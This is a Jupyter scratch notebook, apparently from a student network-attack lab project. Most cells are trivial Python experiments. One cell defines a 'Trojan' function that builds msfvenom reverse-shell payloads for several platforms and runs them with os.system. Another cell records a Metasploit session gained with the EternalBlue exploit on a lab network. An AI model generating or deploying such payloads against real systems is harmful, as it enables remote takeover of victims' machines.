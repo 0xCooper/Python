{
 "metadata": {
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  },
  "orig_nbformat": 2,
  "kernelspec": {
   "name": "python385jvsc74a57bd09f0194299e911b6a22f0cd3d1c9a66c991d39f48b249be23f24104e40900e329",
   "display_name": "Python 3.8.5 64-bit ('base': conda)"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2,
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "output_type": "error",
     "ename": "TypeError",
     "evalue": "'int' object is not subscriptable",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-2-90bed0598233>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0mcmp\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;32mlambda\u001b[0m \u001b[0mx\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0my\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0mcmp\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mx\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0my\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 2\u001b[0;31m \u001b[0mcmp\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;36m2\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m<ipython-input-2-90bed0598233>\u001b[0m in \u001b[0;36m<lambda>\u001b[0;34m(x, y)\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mcmp\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;32mlambda\u001b[0m \u001b[0mx\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0my\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0mcmp\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mx\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0my\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      2\u001b[0m \u001b[0mcmp\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;36m2\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mTypeError\u001b[0m: 'int' object is not subscriptable"
     ]
    }
   ],
   "source": [
    "cmp=lambda x,y:cmp(x[1],y[1])\n",
    "cmp(1,2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "7"
      ]
     },
     "metadata": {},
     "execution_count": 4
    }
   ],
   "source": [
    " g = lambda x:x+1\n",
    " g(6)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "'msfvenom-p windows/meterpreter/reverse_tcpLHOST=%sLPORT=%s-f exe-o '"
      ]
     },
     "metadata": {},
     "execution_count": 1
    }
   ],
   "source": [
    "str=[\"msfvenom\", \"-p\",\" windows/meterpreter/reverse_tcp\" ,\"LHOST=%s\" ,\"LPORT=%s\", \"-f exe\" ,\"-o \",]\n",
    "\"\".join(str)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "'-f elf - > shdasd.elf'"
      ]
     },
     "metadata": {},
     "execution_count": 3
    }
   ],
   "source": [
    "name='shdasd'\n",
    "str_type=\"-f elf - > %s.elf\"%(name)\n",
    "str_type"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "'111222333'"
      ]
     },
     "metadata": {},
     "execution_count": 4
    }
   ],
   "source": [
    "str1=\"111\"\n",
    "str2=\"222\"\n",
    "str3=\"333\"\n",
    "str4=str1+str2+str3\n",
    "str4\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "msfvenom  -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=44444 -f raw -o  ./show.py\n"
     ]
    },
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "metadata": {},
     "execution_count": 12
    }
   ],
   "source": [
    "def Trojan(ip=\"127.0.0.1\",port=\"\",name=\"test\",env=\"linux\"):\n",
    "    str_p=\"msfvenom  -p \"\n",
    "    name=\" ./%s\"%(name)\n",
    "    if env==\"linux\":\n",
    "        str_env=\"linux/x86/meterpreter/reverse_tcp\"\n",
    "        str_type=\" -f elf  -o %s.elf\"%(name)\n",
    "    elif env==\"windows\":\n",
    "        str_env=\"windows/meterpreter/reverse_tcp\"\n",
    "        str_type=\" -f exe  -o %s.exe\"%(name)\n",
    "    elif env==\"windows64\":\n",
    "        str_env=\"windows/x64/meterpreter/reverse_tcp\"\n",
    "        str_type=\" -f exe  -o %s.exe\"%(name)\n",
    "    elif env==\"mac\":\n",
    "        str_env=\"osx/x86/shell_reverse_tcp\"\n",
    "        str_type=\" -f macho  -o %s.macho\"%(name)\n",
    "    elif env==\"php\":\n",
    "        str_env=\"php/meterpreter_reverse_tcp\"\n",
    "        str_type=\" -f raw   -o %s.php\"%(name)\n",
    "    elif env==\"WAR\":\n",
    "        str_env=\"java/jsp_shell_reverse_tcp\"\n",
    "        str_type=\" -f war  -o %s.war\"%(name)\n",
    "    elif env==\"Python\":\n",
    "        str_env=\"cmd/unix/reverse_python\"\n",
    "        str_type=\" -f raw -o %s.py\"%(name)\n",
    "    elif env==\"Bash\":\n",
    "        str_env=\"cmd/unix/reverse_bash\"\n",
    "        str_type=\" -f raw -o %s.sh\"%(name)\n",
    "\n",
    "\n",
    "    str_lhost=\" LHOST=%s\"%(ip)\n",
    "    str_lport=\" LPORT=%s\"%(port)\n",
    "    str_other=\" \"#自定义选项\n",
    "    \n",
    "    str_end=str_p+str_env+str_lhost+str_lport+str_type\n",
    "    print(str_end)\n",
    "    \n",
    "    try:\n",
    "        os.system(str_end)\n",
    "    except:\n",
    "        return 1\n",
    "    return 0\n",
    "Trojan(\"127.0.0.1\",\"44444\",\"show\",\"Python\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "'/windows/E/VsWorkstation/Python/virtualenv/venv/django_workspace/templates'"
      ]
     },
     "metadata": {},
     "execution_count": 8
    }
   ],
   "source": [
    "pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "def ab(a):\n",
    "    lis1=['a','b','c','d','e']\n",
    "    if a in lis1:\n",
    "        print(\"enter\")\n",
    "ab('f')\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "'static/upload/hello'"
      ]
     },
     "metadata": {},
     "execution_count": 25
    }
   ],
   "source": [
    "objname=\"hello\"\n",
    "file_path=os.path.join('static','upload', '', objname) \n",
    "file_path"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "../Demo/__pycache__\n[]\n['serializers.cpython-38.pyc', 'models.cpython-38.pyc', 'apps.cpython-38.pyc', 'views.cpython-38.pyc', '__init__.cpython-38.pyc', 'form.cpython-38.pyc', 'admin.cpython-38.pyc']\n../Demo/migrations/__pycache__\n[]\n['0002_login_time.cpython-38.pyc', '0001_initial.cpython-38.pyc', '__init__.cpython-38.pyc']\n../Demo/migrations\n['__pycache__']\n['0002_login_time.py', '0001_initial.py', '__init__.py']\n../Demo\n['__pycache__', 'migrations']\n['models.py', 'tests.py', 'admin.py', 'views.py', '__init__.py', 'form.py', 'apps.py']\n../MsfApi/__pycache__\n[]\n['method.cpython-38.pyc', 'msfveonm.cpython-38.pyc', 'login.cpython-38.pyc']\n../MsfApi\n['__pycache__']\n['login.py', 'msfveonm.py', 'string_act.py', 'UseIt.py', 'file_act.py', 'readme.md', 'method.py']\n../django_workspace/__pycache__\n[]\n['wsgi.cpython-38.pyc', 'urls.cpython-38.pyc', '__init__.cpython-38.pyc', 'settings.cpython-38.pyc']\n../django_workspace\n['__pycache__']\n['wsgi.py', 'asgi.py', 'settings.py', '__init__.py', 'urls.py']\n../static/files\n[]\n['1234.elf', '444.py']\n../static/upload\n[]\n['溢出栈.xlsx', 'vuln', '牟垠川 201831082313网络攻防实验3.docx', '实验2.md', 'readme.docx']\n../static/assets/avatars\n[]\n['avatar.png', 'user.jpg', 'avatar4.png', 'avatar2.png', 'avatar1.png', 'avatar3.png', 'profile-pic.jpg', 'avatar5.png']\n../static/assets/images/gallery\n[]\n['thumb-2.jpg', 'image-3.jpg', 'thumb-3.jpg', 'thumb-4.jpg', 'image-2.jpg', 'thumb-5.jpg', 'image-4.jpg', 'thumb-1.jpg', 'image-5.jpg', 'image-1.jpg', 'thumb-6.jpg', 'image-6.jpg']\n../static/assets/images\n['gallery']\n[]\n../static/assets/js/markdown\n[]\n['markdown.min.js', 'bootstrap-markdown.min.js']\n../static/assets/js/date-time\n[]\n['moment.min.js', 'bootstrap-datepicker.min.js', 'bootstrap-timepicker.min.js', 'daterangepicker.min.js']\n../static/assets/js/flot\n[]\n['jquery.flot.pie.min.js', 'jquery.flot.min.js', 'jquery.flot.resize.min.js']\n../static/assets/js/fuelux/data\n[]\n['fuelux.tree-sampledata.js']\n../static/assets/js/fuelux\n['data']\n['fuelux.tree.min.js', 'fuelux.spinner.min.js', 'fuelux.wizard.min.js']\n../static/assets/js/jqGrid/i18n\n[]\n['grid.locale-en.js']\n../static/assets/js/jqGrid\n['i18n']\n['jquery.jqGrid.min.js']\n../static/assets/js/x-editable\n[]\n['ace-editable.min.js', 'bootstrap-editable.min.js']\n../static/assets/js\n['markdown', 'date-time', 'flot', 'fuelux', 'jqGrid', 'x-editable']\n['respond.min.js', 'jquery.slimscroll.min.js', 'jquery.autosize.min.js', 'ace-extra.min.js', 'jquery.mobile.custom.min.js', 'jquery.colorbox-min.js', 'jquery-2.0.3.min.js', 'jquery.sparkline.min.js', 'jquery.gritter.min.js', 'bootstrap-colorpicker.min.js', 'fullcalendar.min.js', 'bootstrap-wysiwyg.min.js', 'jquery.hotkeys.min.js', 'jquery-ui-1.10.3.custom.min.js', 'ace-elements.min.js', 'jquery.knob.min.js', 'excanvas.min.js', 'jquery-1.10.2.min.js', 'jquery.validate.min.js', 'jquery.ui.touch-punch.min.js', 'bootbox.min.js', 'html5shiv.js', 'jquery.dataTables.min.js', 'jquery.nestable.min.js', 'typeahead-bs2.min.js', 'chosen.jquery.min.js', 'ace.min.js', 'jquery.inputlimiter.1.3.1.min.js', 'jquery-ui-1.10.3.full.min.js', 'dropzone.min.js', 'jquery.maskedinput.min.js', 'additional-methods.min.js', 'jquery.dataTables.bootstrap.js', 'bootstrap.min.js', 'jquery.easy-pie-chart.min.js', 'bootstrap-tag.min.js', 'select2.min.js']\n../static/assets/css/images\n[]\n['loading.gif']\n../static/assets/css\n['images']\n['font-awesome-ie7.min.css', 'jquery-ui-1.10.3.full.min.css', 'chosen.css', 'jquery-ui-1.10.3.custom.min.css', 'bootstrap-timepicker.css', 'ace-rtl.min.css', 'jquery.gritter.css', 'colorbox.css', 'dropzone.css', 'ace.min.css', 'ace-ie.min.css', 'bootstrap-editable.css', 'daterangepicker.css', 'colorpicker.css', 'datepicker.css', 'font-awesome.min.css', 'select2.css', 'bootstrap.min.css', 'ace-skins.min.css', 'ui.jqgrid.css', 'fullcalendar.css']\n../static/assets/font\n[]\n['fontawesome-webfont.woff']\n../static/assets\n['avatars', 'images', 'js', 'css', 'font']\n[]\n../static\n['files', 'upload', 'assets']\n[]\n../.git/objects/ca\n[]\n['17daf5e7b29eaab55636f5c39a4041a2b7898c']\n../.git/objects/84\n[]\n['bd6647ed8943ce4a192502868c4e528be88642']\n../.git/objects/42\n[]\n['aa6f951244123d81eed7b2578f5a6f25c165bc']\n../.git/objects/cd\n[]\n['37d4a0542830adcde984c28d5e5d96a315bf37']\n../.git/objects/d0\n[]\n['c7d50c375a4747d1c3d4022e8a71200efbe3f3']\n../.git/objects/8f\n[]\n['9f60f688da115b7ab16a6b20883a63b6fe85b9']\n../.git/objects/80\n[]\n['8a5153e19e55725272ede5f2c2cbf288a144d2']\n../.git/objects/2a\n[]\n['bd16c5c2ddee0aff68db854c50d06a472993c7']\n../.git/objects/e0\n[]\n['2cb08c6eb0df1a27a8507a729b9721d7a4fbbf']\n../.git/objects/31\n[]\n['1f3f11add6fa8f6e7af377d985d5c967356a16']\n../.git/objects/a5\n[]\n['aca040ce984f8db29d2ebff8d991deb59a3b76']\n../.git/objects/87\n[]\n['71e5cb171725b1c4f71c2e5b4f34cfbe1e04fc']\n../.git/objects/08\n[]\n['d9611de2bccf3b1211965cd254c697a831fd61']\n../.git/objects/47\n[]\n['10176425f15ab834aef90455a67b4a768f4162']\n../.git/objects/0e\n[]\n['ec857b411b6f86535e6e37d9f40165ba9026b9']\n../.git/objects/ed\n[]\n['3bda410b5b5aa63974f1c5e897effee369e36b']\n../.git/objects/2d\n[]\n['a8550e38e3c01a10bd3784de9f2444419e1460']\n../.git/objects/40\n[]\n['c88050e07cf78fadeb570c452c85a073a6a483']\n../.git/objects/ab\n[]\n['d0f32c821b07e76299a0a41ab55bd11981872b']\n../.git/objects/15\n[]\n['3953ea14867763cc6ed234fd681eeedb618341']\n../.git/objects/f6\n[]\n['fb3ac04ff240b038f0ebeef6141b56db08766f']\n../.git/objects/pack\n[]\n[]\n../.git/objects/16\n[]\n['e5f710b403f07a2457bd11a9adb289cfcf201f', '263d7418a52fb8abc772d80ae58dce6cc16ffa']\n../.git/objects/b8\n[]\n['63e237de7c60991fec8a54c68f905b2eaec364']\n../.git/objects/bd\n[]\n['73bedc156056939196b264f91f7b523fba8f98', 'd0f87b2a6f58bec6d482025d86a3603c0a48aa', '83e6f25fbeee995361379b0e4f83a0098aefed']\n../.git/objects/0f\n[]\n['60b4404363a332ba9c31cadafc2373bb63919d']\n../.git/objects/info\n[]\n[]\n../.git/objects/cb\n[]\n['5513c0270256871e81c5f74ee4d0a655bc2439']\n../.git/objects/95\n[]\n['adb69bba43bae424ebaa236a0024ef0fb8a2a5']\n../.git/objects/62\n[]\n['8ed60692539571ec0c1a85293d48a26065d30a', 'd96575367c720e57d9d1284884f4b371ca4a1b', '80e1d10a70d58a1840654c33b81a219e2ac913']\n../.git/objects/41\n[]\n['a1d603636a9b7bb983547a0e5a89b151d695e0']\n../.git/objects/b2\n[]\n['df330542ee51fca5b5be68cafffb908c3bfb34']\n../.git/objects/50\n[]\n['3106049a95940205e34e5e8c20ed1b7746300f']\n../.git/objects/2c\n[]\n['15847c9330a3e20971d68359a6d6f87b4b9184']\n../.git/objects/e6\n[]\n['3b93e45693e9ae8e378296b6c73fdaae18fbf7', '9de29bb2d1d6434b8b29ae775ad8c2e48c5391', 'a36ae88fd8d8529997e395471c77fbc5487af5']\n../.git/objects/04\n[]\n['44b1e2908496c7abb16faec5a44c2f55beb8e4']\n../.git/objects/8b\n[]\n['26c8b395a4f59aa4932439fc1db06bfa494f9e']\n../.git/objects/fb\n[]\n['789d85b148c07e9fc1b8bb20b0c40378226e71']\n../.git/objects/59\n[]\n['d25c86243e915e1f3288a75c41fbb5f3e9f103', '322fba09ca034be670fe5607b2ecd803ed590b']\n../.git/objects/c8\n[]\n['e8cddcac6d11193b01e711b27ab770439b0707']\n../.git/objects/85\n[]\n['7e5c0d57d4868c75d9f65877e81e288090235b']\n../.git/objects/8a\n[]\n['03cfb8db196521d93bef203df4c4f156c1ad84']\n../.git/objects/8c\n[]\n['12ba0d09e43d976e3ff106f670ab748e254009']\n../.git/objects/25\n[]\n['88afb323b68b24d70341d3c15f083eb46d0e3b']\n../.git/objects/e8\n[]\n['434cd5f926fafbdc8f12cf5fe94e296f2e0b0d']\n../.git/objects/90\n[]\n['a1d925620486db619b77f47db097bb35d38039', '941533d218cd4747693ec8421b2cebf96cdc6e']\n../.git/objects/09\n[]\n['2742ad98c8e39a102a82d01fcb603a20a14483']\n../.git/objects/86\n[]\n['a5bdeecfd7850be0fd453b64769adb98d07f45']\n../.git/objects/7c\n[]\n['e503c2dd97ba78597f6ff6e4393132753573f6']\n../.git/objects/92\n[]\n['af2754822d626cea9f6d593e9363335043de29']\n../.git/objects/e7\n[]\n['001c4de647d855d6e9b729f2e88875514606d0']\n../.git/objects/b0\n[]\n['73bd25e93210d08c08f74886e5d5d73da4df12']\n../.git/objects/94\n[]\n['563c93291c096040b157ce172ba32eff9339c3']\n../.git/objects/20\n[]\n['e24f865192b34c03408a9c13eb4f7b0c0b8f0f']\n../.git/objects/d7\n[]\n['e2cfc2340c8adb800f88a45f6d429ff951e88e']\n../.git/objects\n['ca', '84', '42', 'cd', 'd0', '8f', '80', '2a', 'e0', '31', 'a5', '87', '08', '47', '0e', 'ed', '2d', '40', 'ab', '15', 'f6', 'pack', '16', 'b8', 'bd', '0f', 'info', 'cb', '95', '62', '41', 'b2', '50', '2c', 'e6', '04', '8b', 'fb', '59', 'c8', '85', '8a', '8c', '25', 'e8', '90', '09', '86', '7c', '92', 'e7', 'b0', '94', '20', 'd7']\n[]\n../.git/branches\n[]\n[]\n../.git/info\n[]\n['exclude']\n../.git/refs/tags\n[]\n[]\n../.git/refs/heads\n[]\n['master']\n../.git/refs\n['tags', 'heads']\n[]\n../.git/logs/refs/heads\n[]\n['master']\n../.git/logs/refs\n['heads']\n[]\n../.git/logs\n['refs']\n['HEAD']\n../.git/hooks\n[]\n['commit-msg.sample', 'pre-commit.sample', 'applypatch-msg.sample', 'fsmonitor-watchman.sample', 'prepare-commit-msg.sample', 'update.sample', 'pre-applypatch.sample', 'pre-rebase.sample', 'pre-merge-commit.sample', 'pre-receive.sample', 'pre-push.sample', 'post-update.sample']\n../.git\n['objects', 'branches', 'info', 'refs', 'logs', 'hooks']\n['COMMIT_EDITMSG', 'config', 'description', 'index', 'HEAD']\n../templates\n[]\n['index.html', 'payload.html', 'main.html', 'login_test.html', 'login.html', 'upload.html', 'test.ipynb', 'history.html']\n../\n['Demo', 'MsfApi', 'django_workspace', 'static', '.git', 'templates']\n['db.sqlite3', 'manage.py']\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    " \n",
    "def file_name(file_dir): \n",
    "    for root, dirs, files in os.walk(file_dir,topdown=False):\n",
    "        print(root) #当前目录路径\n",
    "        print(dirs) #当前路径下所有子目录\n",
    "        print(files) #当前路径下所有非目录子文件\n",
    "        # for o in files:\n",
    "        #     print(o)\n",
    "file_name(\"../\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "[{'id': 1, 'name': 'index.html'}, {'id': 2, 'name': 'payload.html'}, {'id': 3, 'name': 'main.html'}, {'id': 4, 'name': 'login_test.html'}, {'id': 5, 'name': 'login.html'}, {'id': 6, 'name': 'upload.html'}, {'id': 7, 'name': 'test.ipynb'}, {'id': 8, 'name': 'history.html'}]\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "def file_list(file_dir):\n",
    "    for root, dirs, files in os.walk(file_dir):\n",
    "        return files\n",
    "        break\n",
    "\n",
    "file_name=file_list(\"./\")\n",
    "j=0\n",
    "filename_list=[]\n",
    "for i in file_name:\n",
    "    dict_name={}\n",
    "    j+=1\n",
    "    dict_name['id']=j\n",
    "    dict_name['name']=i\n",
    "    # print(dict_name)\n",
    "    filename_list.append(dict_name)\n",
    "print(filename_list)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "output_type": "error",
     "ename": "SyntaxError",
     "evalue": "invalid syntax (<ipython-input-18-c876d853cba4>, line 4)",
     "traceback": [
      "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-18-c876d853cba4>\"\u001b[0;36m, line \u001b[0;32m4\u001b[0m\n\u001b[0;31m    print \"目录为: %s\" %os.listdir(os.getcwd())\u001b[0m\n\u001b[0m          ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
     ]
    }
   ],
   "source": [
    "import os, sys\n",
    "\n",
    "# 列出目录\n",
    "print \"目录为: %s\" %os.listdir(os.getcwd())\n",
    "\n",
    "# 移除\n",
    "os.remove(\"aa.txt\")\n",
    "\n",
    "# 移除后列出目录\n",
    "print \"移除后 : %s\" %os.listdir(os.getcwd())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "/asd/asdsh\n"
     ]
    }
   ],
   "source": [
    "filename=\"sh\"\n",
    "file_path=\"/asd/asd\"\n",
    "print(file_path+filename)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "{0: 'she', 1: 'he', 2: 'I'}\n"
     ]
    }
   ],
   "source": [
    "# 列表生成字典\n",
    "list = [\"she\", \"he\", \"I\"]\n",
    "\n",
    "# for index,values  in enumerate(list):\n",
    "#     print(index,values )\n",
    "\n",
    "print(dict(enumerate(list)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "output_type": "error",
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'filetype'",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-23-2585086d06b3>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0;32mimport\u001b[0m \u001b[0mfiletype\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      2\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[0;32mdef\u001b[0m \u001b[0mmain\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      4\u001b[0m  \u001b[0mkind\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfiletype\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mguess\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'tests/fixtures/sample.jpg'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m  \u001b[0;32mif\u001b[0m \u001b[0mkind\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mModuleNotFoundError\u001b[0m: No module named 'filetype'"
     ]
    }
   ],
   "source": [
    "import filetype\n",
    "  \n",
    "def main():\n",
    " kind = filetype.guess('tests/fixtures/sample.jpg')\n",
    " if kind is None:\n",
    "  print('Cannot guess file type!')\n",
    "  return\n",
    "  \n",
    " print('File extension: %s' % kind.extension)\n",
    " print('File MIME type: %s' % kind.mime)\n",
    "  \n",
    "if __name__ == '__main__':\n",
    " main()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "test=['index.html', 'payload.html', 'main.html', 'login_test.html', 'login.html', 'upload.html', 'test.ipynb', 'history.html']\n",
    "for i in test:\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "'hello<br> world'"
      ]
     },
     "metadata": {},
     "execution_count": 31
    }
   ],
   "source": [
    "str=\"hello\\n world\"\n",
    "str=str.replace(\"\\n\", \"<br>\")\n",
    "str"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "SNfRnn1t8fNp\n"
     ]
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "vN1dsxMMaHjSV\n"
     ]
    }
   ],
   "source": [
    "random=\"\".join(random.choices(string.ascii_letters+string.digits,k=random.randint(8,19)))\n",
    "print(random)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "{1: {'type': 'shell', 'tunnel_local': '192.168.137.131:4444', 'tunnel_peer': '192.168.137.3:49311', 'via_exploit': 'exploit/windows/smb/ms17_010_eternalblue', 'via_payload': 'payload/generic/shell_reverse_tcp', 'desc': 'Command shell', 'info': 'Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\\\\Windows\\\\system32>', 'workspace': 'default', 'session_host': '192.168.137.3', 'session_port': 445, 'target_host': '192.168.137.3', 'username': 'root', 'uuid': 't4uqysik', 'exploit_uuid': '9wxkmcxa', 'routes': '', 'arch': 'x64'},"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "{'type': 'shell'}\n{'type': 'console'}\n1  =  {'type': 'shell'}\n2  =  {'type': 'console'}\n"
     ]
    },
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "dict_keys"
      ]
     },
     "metadata": {},
     "execution_count": 12
    }
   ],
   "source": [
    "aaaa={1:{'type': 'shell'},2:{'type':'console'}}\n",
    "type(aaaa)\n",
    "for k in aaaa.keys():\n",
    "    print(aaaa[k])\n",
    "for k ,v in aaaa.items():\n",
    "    print(k,\" = \",v)\n",
    "type(aaaa.keys())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ]
}